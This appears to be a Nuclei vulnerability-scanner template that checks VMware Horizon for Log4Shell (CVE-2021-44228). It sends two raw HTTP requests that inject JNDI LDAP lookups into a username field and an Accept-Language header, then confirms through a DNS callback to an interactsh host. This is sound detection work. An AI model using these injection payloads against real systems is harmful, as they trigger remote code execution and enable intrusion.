id: cve-2021-44228
info:
  name: VMware Horizon log4j2 RCE (CVE-2021-44228)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Various VMware products such as VMware Horizon, VMware vCenter Server, VMware HCX, VMware NSX-T Data Center, etc. are affected by the remote code execution vulnerability CVE-2021-44228. Attackers can exploit this vulnerability to execute remote code and gain control over server permissions.
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0

variables:
  dnslog: '{{interactsh-url}}'

http:
  - raw:
      - |
        POST /broker/xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>securid-passcode</name><params><param><name>username</name><values><value>${jndi:ldap://{{dnslog}}}</value></values></param><param><name>passcode</name><values><value>12321</value></values></param></params></screen></do-submit-authentication></broker>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        GET /portal/webclient/index.html HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: ${jndi:ldap://{{dnslog}}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
